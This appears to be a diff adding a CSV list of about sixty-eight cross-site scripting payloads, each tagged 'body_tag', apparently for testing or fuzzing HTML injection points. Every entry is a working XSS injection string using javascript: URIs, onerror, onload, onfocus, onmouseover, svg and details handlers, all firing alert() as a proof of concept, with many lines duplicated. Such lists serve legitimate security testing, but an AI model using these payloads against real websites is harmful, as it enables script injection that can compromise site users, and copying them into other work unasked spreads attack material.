@@ -1,1 +1,69 @@
 eval_place,injection_code
+body_tag,"</a><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""></a>"
+body_tag,"<marquee onstart=alert('XSS')></div><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<a href=""javascript:alert('XSS')""></iframe><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>"
+body_tag,<img src=x onerror=alert('XSS')></iframe></div>
+body_tag,"</a><img src=x onerror=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>"
+body_tag,</div></div><body onload=alert('XSS')>
+body_tag,"<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')><body onload=alert('XSS')><iframe src=""javascript:alert('XSS')"">"
+body_tag,"</marquee><iframe src=""javascript:alert('XSS')""></iframe>"
+body_tag,"</iframe></div><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>"
+body_tag,</a><img src=x onerror=alert('XSS')></iframe>
+body_tag,"</iframe></div><iframe src=""javascript:alert('XSS')"">"
+body_tag,</marquee><body onload=alert('XSS')><img src=x onerror=alert('XSS')>
+body_tag,"<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><a href=""javascript:alert('XSS')"">"
+body_tag,"</a><iframe src=""javascript:alert('XSS')""><marquee onstart=alert('XSS')>"
+body_tag,"<iframe src=""javascript:alert('XSS')""></iframe><a href=""javascript:alert('XSS')"">"
+body_tag,"</a><iframe src=""javascript:alert('XSS')""></iframe>"
+body_tag,"<a href=""javascript:alert('XSS')""><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')></iframe>"
+body_tag,"</marquee><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<a href=""javascript:alert('XSS')""><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">"
+body_tag,"</a><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">"
+body_tag,"</a><iframe src=""javascript:alert('XSS')""><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>"
+body_tag,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')></iframe><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""></div>"
+body_tag,"</video><iframe src=""javascript:alert('XSS')""><video>"
+body_tag,"</marquee><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>"
+body_tag,"<div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><body onload=alert('XSS')>"
+body_tag,"<marquee onstart=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>"
+body_tag,<iframe/src=javascript:alert('XSS')><div style=background:url(javascript:alert('XSS'))><body/onload=alert('XSS')>
+body_tag,<body/onload=alert('XSS')><body/onload=alert('XSS')><img/src=x onerror=alert('XSS')>
+body_tag,<iframe/src=javascript:alert('XSS')><body/onload=alert('XSS')><img/src=x onerror=alert('XSS')>
+body_tag,<input type=image src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')><body/onload=alert('XSS')>
+body_tag,<input type=image src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')>
+body_tag,<div style=background:url(javascript:alert('XSS'))><img/src=x onerror=alert('XSS')><body/onload=alert('XSS')>
+body_tag,<div style=background:url(javascript:alert('XSS'))><div style=background:url(javascript:alert('XSS'))><body/onload=alert('XSS')>
+body_tag,<iframe/src=javascript:alert('XSS')><div style=background:url(javascript:alert('XSS'))><body/onload=alert('XSS')>
+body_tag,<input type=image src=x onerror=alert('XSS')><div style=background:url(javascript:alert('XSS'))><div style=background:url(javascript:alert('XSS'))>
+body_tag,<iframe/src=javascript:alert('XSS')><img/src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')>
+body_tag,"<details open="""" ontoggle=""javascript:alert('XSS9')""><iframe src=""javascript:alert('XSS6')""><iframe src=""javascript:alert('XSS6')"">"
+body_tag,"<embed src='javascript:alert(""XSS7"")'><div style=""width:expression(alert('XSS5'))""><iframe src=""javascript:alert('XSS6')"">"
+body_tag,"<object data='javascript:alert(""XSS8"")'><iframe src=""javascript:alert('XSS6')""><embed src='javascript:alert(""XSS7"")'>"
+body_tag,"<object data='javascript:alert(""XSS8"")'><div style=""width:expression(alert('XSS5'))""><iframe src=""javascript:alert('XSS6')"">"
+body_tag,"<details open="""" ontoggle=""javascript:alert('XSS9')""><iframe src=""javascript:alert('XSS6')""><iframe src=""javascript:alert('XSS6')"">"
+body_tag,"<div onmouseover='alert(""XSS"")'><a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus>"
+body_tag,"<div onmouseover='alert(""XSS"")'><a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus>"
+body_tag,"<a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus><iframe src='javascript:alert(`XSS`)'>"
+body_tag,"<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>"
+body_tag,"</a><input type='text' value='' onfocus='alert(""XSS"")' autofocus><input type='text' value='' onfocus='alert(""XSS"")' autofocus>"
+body_tag,"<div onmouseover='alert(""XSS"")'><iframe src='javascript:alert(`XSS`)'><svg onload='alert(1)'>"
+body_tag,"<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>"
+body_tag,"<div onmouseover='alert(""XSS"")'><a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus>"
+body_tag,</a><a href='javascript:alert(`XSS`)'></a>
+body_tag,"<input type='text' value='' onfocus='alert(""XSS"")' autofocus><input type='text' value='' onfocus='alert(""XSS"")' autofocus><a href='javascript:alert(`XSS`)'>"
+body_tag,"javascript:alert(</div><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<img src=""x"" onerror=""alert('XSS')"">javascript:alert(action='"""
+body_tag,"<img src=""x"" onerror=""alert('XSS')""><img src='x' onerror='alert(1)'/>javascript:alert("
+body_tag,"<body onload=""alert('XSS')""><video>action='"""
+body_tag,"<iframe src=""javascript:alert('XSS')""></div><img src='x' onerror='alert(1)'/>"
+body_tag,"<iframe src=""javascript:alert('XSS')""><source onerror='javascript:alert(""XSS"")'><iframe src=""javascript:alert('XSS')"">"
+body_tag,"<body onload=""alert('XSS')""><iframe src=""javascript:alert('XSS')""><video>"
+body_tag,"<a href='javascript:alert(""XSS5"");'><svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')>"
+body_tag,"<div onmouseover='alert(""XSS7"")'><div onmouseover='alert(""XSS7"")'><svg onload=alert('XSS3')>"
+body_tag,"<input type='text' value='' onchange='alert(""XSS4"")'></form><svg onload=alert('XSS3')>"
+body_tag,"<div onmouseover='alert(""XSS7"")'><body onload=alert('XSS4')><a href='javascript:alert(""XSS5"");'>"
+body_tag,"<a href='javascript:alert(""XSS5"");'><img src=x onerror=alert('XSS2')><img src=x onerror=alert('XSS2')>"
+body_tag,"<svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')><a href='javascript:alert(""XSS5"");'>"
+body_tag,"</math><a href=""javascript:alert('XSS7');""><svg onload=alert('XSS3')>"
